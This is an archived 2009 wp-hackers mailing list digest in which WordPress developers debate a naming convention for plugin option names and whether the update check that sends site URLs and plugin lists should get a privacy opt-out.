Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <161617690912091043q5b2d3cc6u55e10718cb040467@mail.gmail.com>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>	<4B1FCDFE.2070802@gunters.org>
	<161617690912091043q5b2d3cc6u55e10718cb040467@mail.gmail.com>
Message-ID: <4B200261.8060102@gunters.org>

On Dec 9 2009 1:43 PM, Otto wrote:
> On Wed, Dec 9, 2009 at 10:19 AM, Dougal Campbell<dougal at gunters.org>  wrote:
>    
>> In a nutshell, my proposal was going to be that we use a naming convention
>> like: [area]:[slug]:[name]
>>
>> For example, if you had a plugin named "Tweet Fu" (which has the slug
>> 'tweet-fu' in the respository), you might have an option named:
>> plugin:tweet-fu:last_tweet_timestamp
>>
>> Or if you have a theme that saves its own option:
>> theme:my-theme-name:header_image_filename
>>      
> Generally speaking, most plugins should be using a single option
> holding an array of their settings. I tend to go with
> pluginname-options, personally.
>
> Any "standard" should take this into account, as keeping every option
> in a separate row can be bad practice.
>    

I think part of the reason that consolidating multiple options into a 
single array is considered best-practice now, is *because of* the 
current state of option chaos. That, and the fact that you don't have to 
make 10 separate db calls to get 10 different options. But if the 
options were namespaced consistently you could just SELECT ... WHERE 
option_name LIKE 'plugin:foo-plug:%' and get all your info in one call 
anyways.

Regardless, even if everyone used an array for all options (which is 
fine for probably 99% of the plugins out there), the namespacing idea 
would still make it easier to make sense of things in those rare cases 
when you have to dive directly into the table for some reason.

Again, I'm not sure whether or not its an idea worth trying to champion. 
But at the least, I figure it's at least worth seeing if some more solid 
best-practices could be extracted from the discussion. Currently 
(AFAIK), the extent of best-practices around saving options is "store 
all values together in an array whenever possible" and "prefix your 
option name", with little guidance as to a prefix format.

Do we *need* to define a suggested prefix format? I dunno -- maybe it's 
overkill. There's no easy way to enforce it without making changes to 
core (though I have some ideas about that). Would a consistent prefix 
format be useful? That's what I'd like us to discuss.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From wp at xentek.net  Wed Dec  9 20:23:38 2009
From: wp at xentek.net (Eric Marden)
Date: Wed, 9 Dec 2009 15:23:38 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
	<71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>
	<161617690912091039g15975843y422c706524d65bbf@mail.gmail.com>
	<71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>
Message-ID: <F9C94F1E-9065-4725-A919-DD9FF7066678@xentek.net>

On Dec 9, 2009, at 2:31 PM, Doug Stewart wrote:

> Is it
> paranoid for me to worry about Facebook sharing my contact
> information, likes, dislikes, etc. with third party advertisers?


isn't that the only reason to be on facebook? ;)


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From cjscott69 at gmail.com  Wed Dec  9 20:26:27 2009
From: cjscott69 at gmail.com (Chris Scott)
Date: Wed, 9 Dec 2009 15:26:27 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <4B200261.8060102@gunters.org>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<4B1FCDFE.2070802@gunters.org>
	<161617690912091043q5b2d3cc6u55e10718cb040467@mail.gmail.com>
	<4B200261.8060102@gunters.org>
Message-ID: <469fb3cc0912091226y6f6beac5x6a08ef24c77bfa17@mail.gmail.com>

On Wed, Dec 9, 2009 at 3:02 PM, Dougal Campbell <dougal at gunters.org> wrote:
> On Dec 9 2009 1:43 PM, Otto wrote:
>>
>> On Wed, Dec 9, 2009 at 10:19 AM, Dougal Campbell<dougal at gunters.org>
>> ?wrote:
>>
>>>
>>> In a nutshell, my proposal was going to be that we use a naming
>>> convention
>>> like: [area]:[slug]:[name]
>>>
>>> For example, if you had a plugin named "Tweet Fu" (which has the slug
>>> 'tweet-fu' in the respository), you might have an option named:
>>> plugin:tweet-fu:last_tweet_timestamp
>>>
>>> Or if you have a theme that saves its own option:
>>> theme:my-theme-name:header_image_filename
>>>
>>
>> Generally speaking, most plugins should be using a single option
>> holding an array of their settings. I tend to go with
>> pluginname-options, personally.
>>
>> Any "standard" should take this into account, as keeping every option
>> in a separate row can be bad practice.
>>
>
> I think part of the reason that consolidating multiple options into a single
> array is considered best-practice now, is *because of* the current state of
> option chaos. That, and the fact that you don't have to make 10 separate db
> calls to get 10 different options. But if the options were namespaced
> consistently you could just SELECT ... WHERE option_name LIKE
> 'plugin:foo-plug:%' and get all your info in one call anyways.
>
> Regardless, even if everyone used an array for all options (which is fine
> for probably 99% of the plugins out there), the namespacing idea would still
> make it easier to make sense of things in those rare cases when you have to
> dive directly into the table for some reason.
>
> Again, I'm not sure whether or not its an idea worth trying to champion. But
> at the least, I figure it's at least worth seeing if some more solid
> best-practices could be extracted from the discussion. Currently (AFAIK),
> the extent of best-practices around saving options is "store all values
> together in an array whenever possible" and "prefix your option name", with
> little guidance as to a prefix format.
>
> Do we *need* to define a suggested prefix format? I dunno -- maybe it's
> overkill. There's no easy way to enforce it without making changes to core
> (though I have some ideas about that). Would a consistent prefix format be
> useful? That's what I'd like us to discuss.

Something to throw into the mix for using options for storage is that
if they are set to autoload, then the entire array of autoloaded
options are put into one cache object. Using memcached means you are
limited to a bit under 1MB for all your autoloaded options and the
same for any single non-autoloaded option since they are cached
individually.

--
Chris Scott
http://iamzed.com/
http://hailtheale.com/

>
> --
> Dougal Campbell <dougal at gunters.org>
> http://dougal.gunters.org/
> http://twitter.com/dougal
> http://twitual.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Wed Dec  9 20:35:44 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 14:35:44 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com> 
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com> 
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com> 
	<71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com> 
	<161617690912091039g15975843y422c706524d65bbf@mail.gmail.com> 
	<71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>
Message-ID: <161617690912091235g67561ca5q19e878558596d33a@mail.gmail.com>

On Wed, Dec 9, 2009 at 1:31 PM, Doug Stewart <zamoose at gmail.com> wrote:
> Is it "paranoia" to worry about my credit card company's databases
> being compromised and thus revealing far more information about me
> than I want public? Is it "paranoia" to be concerned about the same
> thing when it comes to my health care insurance provider? Is it
> paranoid for me to worry about Facebook sharing my contact
> information, likes, dislikes, etc. with third party advertisers?

Yes, yes, and no.

Credit card companies have been exploited fairly regularly. However,
nobody much cares because I and anybody else can get a copy of your
credit report for just a few bucks, with nothing more than your name
and perhaps your address or past address. Credit information is
generally public by its very nature. If I got your credit card number,
I could charge a few things up, but you wouldn't owe squat, and I'd
get cut off and probably caught fairly quickly nowadays. Fraud
detection has advanced leaps and bounds. I know this from working
directly with several credit card companies on the subject.

Health care information is protected by laws and medical ethics and
such, so while it's not paranoid to be sure that the company uses
HIPAA certified software, it is paranoid to require that they tell you
in advance. They all use HIPAA software, because the alternative is
basically jail-time.

Facebook, on the other hand, has had many privacy problems. They are
trying to address them, and generally failing at it, IMO.

> You seem to be making the argument that "Well, if you install
> WordPress, you're defacto signing away any notions of privacy, at
> least inasmuch as Automattic is concerned".

Not at all. I'm making the argument that there's no particular damage
that can be done with the information that can't be done without the
information. Many sites have lists of the plugins they use right on
them. You can browse the source of a site and make an educated guess
at what plugins he's using. Heck, if you visit /wp-content/plugins on
most sites, the directory isn't even protected against indexing, so
you can see the list right there. This is not top-secret information
here. Knowing what plugins you run helps not in the slightest for most
things.

> The point that I have yet to see YOU make is a compelling case for WHY
> a blog's URL needs to be sent to Automattic at all. Why not an MD5
> hash of the URL, as was suggested in this thread, the '07 thread and
> the Trac ticket? This guarantees uniqueness with at least a gloss of
> anonymity, potentially satisfying both ends of the transaction's
> concerns.

No, I disagree. The burden of proof is not on me, the burden of proof
lies on the person wanting to obfuscate things for no reason that I
can figure out.

See, your URL is not top-secret information. It's information that is
readily available. It's in Google, it's in your address bar, your site
sends it to Ping servers every time you post, it sends it to random
other blogs as pingbacks whenever you link to them.

Your URL is not something you hide anywhere else, it makes no sense to
me to hide it here.

But if you want to hide it and send an MD5, then make a plugin to do
so. It's easy, and the solution to doing so has been posted in this
very thread.

> Opt-out options, full disclosure, etc. are part of the social
> engineering/social compact/good citizen argument, which is a separate
> matter from the technical concerns.

I've seen no legitimate reason for this sort of thing to be in the
core code. There's no valid reason I can find to opt-out of sending
your blog URL, considering that it's not sending any other
particularly useful information along with it. The URL is a unique
identifier, we use it as such all the time. Permalinks are used as
GUIDs on a regular basis. This is standard practice.

I'm not saying that you can't obfuscate your URL. I'm saying that it
should not be a checkbox in the core, for these reasons:
1. There's no really valid reason to do so, other than paranoia.
2. It creates confusion. A lot of silly "WordPress spies on me?" and
the like. No amount of explanation will make this otherwise.
3. It is something that only an extremely small percentage of users
would ever use. This makes it plugin territory, more or less by
definition.

Now, if you want to argue that this sort of thing should be a
Canonical Plugin, well, then I'd say you have more ground to stand
upon. I'd see no particular problem with that. I just don't care for
useless options in the core. There's far too many of them in there
already, IMO.

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Wed Dec  9 21:03:05 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 9 Dec 2009 16:03:05 -0500
Subject: [wp-hackers] Some Left-Field names for Canonical Plugins
In-Reply-To: <71ddd7490912090837v1d4d3276k8c9c9be29a904328@mail.gmail.com>
References: <71ddd7490912071944x6e289edbic8dcb00b6a021e41@mail.gmail.com>
	<e1202cb10912090817g70223f7aq6a0dd10fd3c396c2@mail.gmail.com>
	<71ddd7490912090837v1d4d3276k8c9c9be29a904328@mail.gmail.com>
Message-ID: <42C3213A-F720-478C-8FB4-2B0B677A352D@newclarity.net>

On Dec 9, 2009, at 11:37 AM, Doug Stewart wrote:
> Since folks have been talking about these yet-unnamed plugins as
> sturdy bases from which to author all manner of WP-related goodness, I
> was also thinking "Foundation[al]" or "Bedrock" might be decent
> additions to the list.
> 

"Foundational."  I like the direction that implies. 

-Mike

From zamoose at gmail.com  Wed Dec  9 21:11:40 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 16:11:40 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912091235g67561ca5q19e878558596d33a@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
	<71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>
	<161617690912091039g15975843y422c706524d65bbf@mail.gmail.com>
	<71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>
	<161617690912091235g67561ca5q19e878558596d33a@mail.gmail.com>
Message-ID: <71ddd7490912091311p337485e5h4b1f6fc7ad532c0c@mail.gmail.com>

On 12/9/09, Otto <otto at ottodestruct.com> wrote:
> Yes, yes, and no.
>
> Credit card companies have been exploited fairly regularly. However,
> nobody much cares because I and anybody else can get a copy of your
> credit report for just a few bucks, with nothing more than your name
> and perhaps your address or past address. Credit information is
> generally public by its very nature. If I got your credit card number,
> I could charge a few things up, but you wouldn't owe squat, and I'd
> get cut off and probably caught fairly quickly nowadays. Fraud
> detection has advanced leaps and bounds. I know this from working
> directly with several credit card companies on the subject.
>

Bad example #1. Credit cards "ship" to their users wrapped in reams of
disclosure statements, privacy statements, etc.  WordPress doesn't.

> Health care information is protected by laws and medical ethics and
> such, so while it's not paranoid to be sure that the company uses
> HIPAA certified software, it is paranoid to require that they tell you
> in advance. They all use HIPAA software, because the alternative is
> basically jail-time.
>

Bad example #2. You explicitly sign a HIPAA disclosure form every time
you join a new plan, visit a new specialist or in some cases even when
you hand your prescription card over at Walgreens. WordPress doesn't
disclose nor does it ask your consent.

> Facebook, on the other hand, has had many privacy problems. They are
> trying to address them, and generally failing at it, IMO.
>

Bad example #3. FB has a ToS and a privacy policy that everyone that
signs up with them agrees to. WordPress does not.

>> You seem to be making the argument that "Well, if you install
>> WordPress, you're defacto signing away any notions of privacy, at
>> least inasmuch as Automattic is concerned".
>
> Not at all. I'm making the argument that there's no particular damage
> that can be done with the information that can't be done without the
> information.

Simply untrue. You're thinking outside the firewall.  I'm thinking
inside (previously known as "Intranets").

> Many sites have lists of the plugins they use right on
> them.

And every single site that does so explicitly installed and activated
a plugin, of their own volition, in order to do so.

> You can browse the source of a site and make an educated guess
> at what plugins he's using. Heck, if you visit /wp-content/plugins on
> most sites, the directory isn't even protected against indexing, so
> you can see the list right there. This is not top-secret information
> here. Knowing what plugins you run helps not in the slightest for most
> things.
>

You can, certainly, as an anonymous third party.  You're also not the
provider, maintainer and architect behind the software running on
their site. WP.org/Automattic are.

>
> No, I disagree. The burden of proof is not on me, the burden of proof
> lies on the person wanting to obfuscate things for no reason that I
> can figure out.
>
> See, your URL is not top-secret information. It's information that is
> readily available.

Not true. See point above in re: intranets.

> It's in Google, it's in your address bar, your site
> sends it to Ping servers every time you post, it sends it to random
> other blogs as pingbacks whenever you link to them.
>

An inapt comparison. If my blog was sending a full dump of its WP
version, installed plugins, MySQL and PHP version strings, etc. to
every pingback service in the world, I'd have a problem with that too.

> Your URL is not something you hide anywhere else, it makes no sense to
> me to hide it here.
>

My point isn't the URL, it's the URL *in combination with a whole host
of other, less-publicly-available information*.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From peter.westwood at ftwr.co.uk  Wed Dec  9 22:15:04 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 9 Dec 2009 22:15:04 +0000
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
Message-ID: <71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>


On 9 Dec 2009, at 16:15, Otto wrote:

> Because, by default, WordPress sends your URL to Pingomatic every
> single time you post. That's sort of the whole point of XML-RPC pings.
> And, Pingomatic is owned by Automattic, in case you were unaware.
>

Actually Pingomatic is run by the WordPress Foundation not Automattic  
as is WordPress.org

Of course you url also goes out everytime you ping/trackback another  
blog article as well.

Cheers

Peter
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From zamoose at gmail.com  Wed Dec  9 22:21:13 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 17:21:13 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
Message-ID: <71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>

On 12/9/09, Peter Westwood <peter.westwood at ftwr.co.uk> wrote:
>
> Actually Pingomatic is run by the WordPress Foundation not Automattic
> as is WordPress.org
>

Maybe I missed the press release somewhere, but: WPF?  When did that
happen?  I know rumors of the creation of such a non-profit beast have
been swirling for a while, but I wasn't aware that anything had been
set in stone...

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From mikeschinkel at newclarity.net  Wed Dec  9 23:06:44 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 9 Dec 2009 18:06:44 -0500
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <4B1FCDFE.2070802@gunters.org>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com>
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<4B1FCDFE.2070802@gunters.org>
Message-ID: <B4BAF086-00D4-4682-A8F4-0EF9C2426F66@newclarity.net>

On Dec 9, 2009, at 11:19 AM, Dougal Campbell wrote:
> On Dec 8 2009 6:45 PM, Mike Schinkel wrote:
>> Without commenting on the worth of the idea (because I haven't considered how it would work in all scenarios yet) I will say that the idea is orthogonal to the problem of mismatched names across plugins.  Using the approach you propose we'll still have the problem where one plugin called a data item "Start Date" and another calls it "Event Date."
>> 
>> Yes those two data elements can live in harmony with each other (that's no different from custom fields that are already in WordPress) but that still doesn't allow the two plugins to work together by sharing data. Until they somehow agree that an event's starting date is  named either "Start Date" or "Event Date" then they will be incompatibility and the sum won't be greater than the parts.
>>   
> 
> Focusing on just the part of this that deals with name collisions between plugins... Back in August, I started a draft post where I was going to propose a standard format for plugin option names, in order to reduce namespace collisions. After writing a few paragraphs, I decided not to publish it, because it was pretty esoteric, probably not of interest except to a few developers, and I had doubts that enough developers would actually adopt anything like it. But since there's a discussion going that's touching on the subject, I now wonder if I should touch my post up and publish it?
> 
> In a nutshell, my proposal was going to be that we use a naming convention like: [area]:[slug]:[name]
> 
> ...
> 
> Any interest in me publishing the post with more details of the pros and cons? As I said, I doubt that it's anything that will take the world by storm, but perhaps the idea could evolve into some sort of suggested Best Practice.

That's an interesting idea and I'd be interested in reading it if you have the time to publish it.  I think is makes sense to decide upon and then publish a best practice.

Point of note however, I wasn't addressing namespace collisions so much as advocating how a shared baseline plugin for a common use case that is deemed not applicable to the core (like adding Twitter or Event support) which would resolve the issue of having two different plugins use different names for options that are effectively the same by simply bypassing the issue.

-Mike

From jer at simianuprising.com  Wed Dec  9 23:12:03 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 9 Dec 2009 18:12:03 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
Message-ID: <e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>

Reasons for making this a core option:

1) The privacy settings page is uselessly empty right now. Adding more
options to it would make it more visually appealing and make it seem
less like an afterthought.
2) It will increase bloat by ~0.00001%
3) It should not take long to code, compared to e.g. this thread.
4) It will serve a triple purpose: Informing people about the
information being sent, why its good that it is being sent, and
allowing them to disable it to varying degrees if they want it.
5) It is the right thing to do with regard to privacy, even if there
is no immediately-conceivable reason why sensible people would choose
to disable the information sending.

Reasons for not making this a core option:

1) We fear that the rest of the collected data will be uselessly incomplete.
2) It didn't have an option before and we are unwilling to change things.
3) We think people who see the option are too stupid to be trusted with it.

-------

The second list is judgmental towards the status quo position but I
don't think there are any fundamental arguments against the setting
that don't fit into one of the stated reasons. I would never use the
option, but if I didn't know about the pinging then after considering
the setting I would be glad I was made aware of it and more trusting
of WordPress as a result.


-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From photofantaisie at gmail.com  Wed Dec  9 23:41:32 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Thu, 10 Dec 2009 00:41:32 +0100
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com>
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
Message-ID: <9dd057850912091541s77c96a65n70005e4fd9ef0c0b@mail.gmail.com>

2009/12/10 Jeremy Clarke <jer at simianuprising.com>

>
> 5) It is the right thing to do with regard to privacy,
>

Exactly. Adding this to core may not make the greatest of sense,
technically, to WP experts, but in my opinion this is irrelevant. This is a
question of transparency and trust, and Wordpress should do the right thing.

Ade.

From lynne.pope at gmail.com  Thu Dec 10 00:20:18 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 10 Dec 2009 13:20:18 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com> 
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com>
Message-ID: <427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>

The first rule of data privacy is only collect what is absolutely necessary.
The second rule is to ensure people know what is collected and how it is
used.

Depending on legal juridiction, there is a third rule - disclosure of
information must be optional and opt-in.

None of these apply to WordPress.

It is not necessary to collect information about plugins and themes that are
external to the repository. There is no valid reason for descriptions to be
collected. Each update query sends the IP address which is, itself, a unique
identifier - associating the blog URL to the rest of the data is
unnecessary.

We can all argue till the cows come home but it won't change the fact that
some users (of those who are aware that this data is even being sent) are
concerned and are being disadvantaged due to privacy concerns. These can be
alleviated very easily and would buy a lot of goodwill in the process.

Lynne

From chris at clwill.com  Thu Dec 10 00:51:57 2009
From: chris at clwill.com (Chris Williams)
Date: Wed, 9 Dec 2009 19:51:57 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
Message-ID: <C7458636.47D0%chris@clwill.com>

+1


________________________________
From: Lynne Pope <lynne.pope at gmail.com>
Subject: Re: [wp-hackers] Revisiting phone home and privacy

We can all argue till the cows come home but it won't change the fact that
some users (of those who are aware that this data is even being sent) are
concerned and are being disadvantaged due to privacy concerns. These can be
alleviated very easily and would buy a lot of goodwill in the process.

From bryanspahr at gmail.com  Thu Dec 10 02:04:40 2009
From: bryanspahr at gmail.com (Bryan Spahr)
Date: Wed, 9 Dec 2009 21:04:40 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
Message-ID: <5d49cb490912091804j6369f7f4jec74b6a18d893860@mail.gmail.com>

2009/12/10 Ade Walker <photofantaisie at gmail.com>

>
> 2009/12/10 Jeremy Clarke <jer at simianuprising.com>
>
> >
> > 5) It is the right thing to do with regard to privacy,
> >
>
> Exactly. Adding this to core may not make the greatest of sense,
> technically, to WP experts, but in my opinion this is irrelevant. This is a
> question of transparency and trust, and Wordpress should do the right
> thing.
>
> Ade.
>

+1.  I may know better, but dammit, wp is going to make me explain it to my
clients? wtf?

From zamoose at gmail.com  Thu Dec 10 02:15:39 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 21:15:39 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
	<71ddd7490912091421v4bce33c7sefaa6ae87f632f1e@mail.gmail.com> 
	<e1202cb10912091512l468ef0bbu176b495872f133c1@mail.gmail.com> 
	<427667db0912091620k7c6f01d3u41b8aa75a240b9a5@mail.gmail.com>
Message-ID: <71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>

On Wed, Dec 9, 2009 at 7:20 PM, Lynne Pope <lynne.pope at gmail.com> wrote:

>
> It is not necessary to collect information about plugins and themes that
> are
> external to the repository. There is no valid reason for descriptions to be
> collected. Each update query sends the IP address which is, itself, a
> unique
> identifier - associating the blog URL to the rest of the data is
> unnecessary.
>
>
I agree with most of your points except for this one. Shared hosts share IPs
as well as hardware in many cases.

Or, in my case, my multiple domains all share the same IP address, so you DO
need to provide something a bit more specific than IP in order to ensure
true uniqueness.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From lynne.pope at gmail.com  Thu Dec 10 02:26:29 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 10 Dec 2009 15:26:29 +1300
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912091815r1da3d79br8e3206f1d13c72b1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71844431-4FF0-4FD7-B14C-588E19C2F0DB@ftwr.co.uk>
